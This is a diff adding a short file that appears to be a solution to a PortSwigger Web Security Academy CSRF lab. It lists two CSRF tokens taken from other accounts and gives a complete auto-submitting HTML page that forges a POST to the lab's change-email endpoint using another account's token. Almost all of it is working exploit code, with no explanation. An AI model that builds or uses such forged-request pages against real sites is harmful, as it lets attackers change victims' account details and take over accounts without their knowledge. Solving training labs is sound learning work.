@@ -1,0 +1,18 @@
+// CSRF tokens obtained from other accounts
+3KE7tAJIDoGiyobDNT21Jk5NdVPXry33
+nslDZHPXyBN1i7ZkyLZEvnBwBvjV7kll
+
+// Create fake form on attacker site with other account's CSRF
+<html>
+<body>
+<script>history.pushState('','','/')</script>
+<form action="https://acb21f9d1f3253d2807419eb000300c7.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="hidden" name="csrf" value="3KE7tAJIDoGiyobDNT21Jk5NdVPXry33">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
